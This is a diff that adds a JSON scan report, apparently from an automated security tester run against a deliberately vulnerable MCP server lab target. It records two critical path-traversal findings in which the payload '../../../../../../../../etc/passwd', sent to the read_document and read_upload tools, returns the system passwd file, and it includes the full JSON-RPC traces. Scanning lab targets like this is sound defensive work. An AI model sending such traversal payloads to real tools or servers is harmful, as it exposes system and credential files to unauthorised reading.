@@ -1,0 +1,207 @@
+{
+  "target": "DVMCP-c6",
+  "passed": false,
+  "highest_severity": "CRITICAL",
+  "summary": {
+    "total_scenarios": 2,
+    "vulnerabilities": 2
+  },
+  "findings": [
+    {
+      "attack_id": "mcp-path-traversal",
+      "attack_name": "Path Traversal / Unsandboxed File Read",
+      "scenario_label": "mcp-path-traversal:read_document",
+      "vector": null,
+      "tool": "read_document",
+      "category": {
+        "key": "mcp_path_traversal",
+        "title": "Path Traversal / Unsandboxed File Access",
+        "owasp_id": null,
+        "owasp_label": "Path Traversal / Unsandboxed File Access (not MCP-specific \u2014 see category description)",
+        "owasp_verified": true,
+        "nist_refs": [
+          "NIST AI 100-2 (Adversarial ML taxonomy, Mar 2025 agent update): Excessive Agency"
+        ]
+      },
+      "success": true,
+      "severity": "CRITICAL",
+      "confidence": 0.97,
+      "rationale": "The tool returned the contents of a file outside any intended directory \u2014 path traversal / missing sandboxing (proven read).",
+      "evidence": [
+        "Payload: document_name='../../../../../../../../etc/passwd'",
+        "Observed system-file signature 'root:x:0:0:'",
+        "Leaked content: root:x:0:0:root:/root:/bin/bash \u23ce daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin \u23ce bin:x:2:2:bin:/bin:/usr/sbin/nologin \u23ce sys:x:3:3:sys:/dev:/usr/sbin/nologin \u23ce sync:x:4:65534:sync:/bin:/bin/sync \u23ce games:x:5:60:games:/usr/games:/usr/sbin/n\u2026"
+      ],
+      "tool_calls": [
+        {
+          "name": "read_document",
+          "arguments": {
+            "document_name": "../../../../../../../../etc/passwd"
+          },
+          "output": "root:x:0:0:root:/root:/bin/bash \u23ce daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin \u23ce bin:x:2:2:bin:/bin:/usr/sbin/nologin \u23ce sys:x:3:3:sys:/dev:/usr/sbin/nologin \u23ce sync:x:4:65534:sync:/bin:/bin/sync \u23ce games:x:5:60:games:/usr/games:/usr/sbin/n\u2026"
+        }
+      ],
+      "witness": {
+        "version": 1,
+        "tool": {
+          "name": "read_document",
+          "schema_sha256": "b0143904c332eb78e08404017f4224cf54fc35780ab419b6fe705ac8b87c8d91"
+        },
+        "sigma": {
+          "target_path": [
+            "document_name"
+          ],
+          "arguments": {
+            "document_name": "../../../../../../../../etc/passwd"
+          }
+        },
+        "payload": {
+          "class": "path-traversal",
+          "text": "../../../../../../../../etc/passwd"
+        },
+        "trace": [
+          {
+            "dir": "out",
+            "t": 3880.031279,
+            "msg": {
+              "jsonrpc": "2.0",
+              "id": 4,
+              "method": "tools/call",
+              "params": {
+                "name": "read_document",
+                "arguments": {
+                  "document_name": "../../../../../../../../etc/passwd"
+                }
+              }
+            }
+          },
+          {
+            "dir": "in",
+            "t": 3880.033458,
+            "msg": {
+              "jsonrpc": "2.0",
+              "id": 4,
+              "result": {
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\ntcpdump:x:100:101::/nonexistent:/usr/sbin/nologin\ntargetuser:x:1001:1001::/home/targetuser:/bin/bash\n"
+                  }
+                ],
+                "structuredContent": {
+                  "result": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\ntcpdump:x:100:101::/nonexistent:/usr/sbin/nologin\ntargetuser:x:1001:1001::/home/targetuser:/bin/bash\n"
+                },
+                "isError": false
+              }
+            }
+          }
+        ],
+        "oracle": {
+          "type": "sigfile",
+          "soundness": "signature",
+          "pattern": "root:.*?:0:0:",
+          "match": "root:x:0:0:"
+        },
+        "session_sha256": "e3c95c6e77904797d98c1030491700cbab52b8e4df22310c255571f0bff84aa1"
+      }
+    },
+    {
+      "attack_id": "mcp-path-traversal",
+      "attack_name": "Path Traversal / Unsandboxed File Read",
+      "scenario_label": "mcp-path-traversal:read_upload",
+      "vector": null,
+      "tool": "read_upload",
+      "category": {
+        "key": "mcp_path_traversal",
+        "title": "Path Traversal / Unsandboxed File Access",
+        "owasp_id": null,
+        "owasp_label": "Path Traversal / Unsandboxed File Access (not MCP-specific \u2014 see category description)",
+        "owasp_verified": true,
+        "nist_refs": [
+          "NIST AI 100-2 (Adversarial ML taxonomy, Mar 2025 agent update): Excessive Agency"
+        ]
+      },
+      "success": true,
+      "severity": "CRITICAL",
+      "confidence": 0.97,
+      "rationale": "The tool returned the contents of a file outside any intended directory \u2014 path traversal / missing sandboxing (proven read).",
+      "evidence": [
+        "Payload: upload_name='../../../../../../../../etc/passwd'",
+        "Observed system-file signature 'root:x:0:0:'",
+        "Leaked content: root:x:0:0:root:/root:/bin/bash \u23ce daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin \u23ce bin:x:2:2:bin:/bin:/usr/sbin/nologin \u23ce sys:x:3:3:sys:/dev:/usr/sbin/nologin \u23ce sync:x:4:65534:sync:/bin:/bin/sync \u23ce games:x:5:60:games:/usr/games:/usr/sbin/n\u2026"
+      ],
+      "tool_calls": [
+        {
+          "name": "read_upload",
+          "arguments": {
+            "upload_name": "../../../../../../../../etc/passwd"
+          },
+          "output": "root:x:0:0:root:/root:/bin/bash \u23ce daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin \u23ce bin:x:2:2:bin:/bin:/usr/sbin/nologin \u23ce sys:x:3:3:sys:/dev:/usr/sbin/nologin \u23ce sync:x:4:65534:sync:/bin:/bin/sync \u23ce games:x:5:60:games:/usr/games:/usr/sbin/n\u2026"
+        }
+      ],
+      "witness": {
+        "version": 1,
+        "tool": {
+          "name": "read_upload",
+          "schema_sha256": "312cafa0e48d4269e769e16e5794bb71c29c7ef8dc216d4f35132be68d3ea204"
+        },
+        "sigma": {
+          "target_path": [
+            "upload_name"
+          ],
+          "arguments": {
+            "upload_name": "../../../../../../../../etc/passwd"
+          }
+        },
+        "payload": {
+          "class": "path-traversal",
+          "text": "../../../../../../../../etc/passwd"
+        },
+        "trace": [
+          {
+            "dir": "out",
+            "t": 3880.055355,
+            "msg": {
+              "jsonrpc": "2.0",
+              "id": 13,
+              "method": "tools/call",
+              "params": {
+                "name": "read_upload",
+                "arguments": {
+                  "upload_name": "../../../../../../../../etc/passwd"
+                }
+              }
+            }
+          },
+          {
+            "dir": "in",
+            "t": 3880.057474,
+            "msg": {
+              "jsonrpc": "2.0",
+              "id": 13,
+              "result": {
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\ntcpdump:x:100:101::/nonexistent:/usr/sbin/nologin\ntargetuser:x:1001:1001::/home/targetuser:/bin/bash\n"
+                  }
+                ],
+                "structuredContent": {
+                  "result": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\ntcpdump:x:100:101::/nonexistent:/usr/sbin/nologin\ntargetuser:x:1001:1001::/home/targetuser:/bin/bash\n"
+                },
+                "isError": false
+              }
+            }
+          }
+        ],
+        "oracle": {
+          "type": "sigfile",
+          "soundness": "signature",
+          "pattern": "root:.*?:0:0:",
+          "match": "root:x:0:0:"
+        },
+        "session_sha256": "76e39272bdcc702e6a9b8f01f221f8feb5ab23ddffc18e29feed15f242591073"
+      }
+    }
+  ]
+}
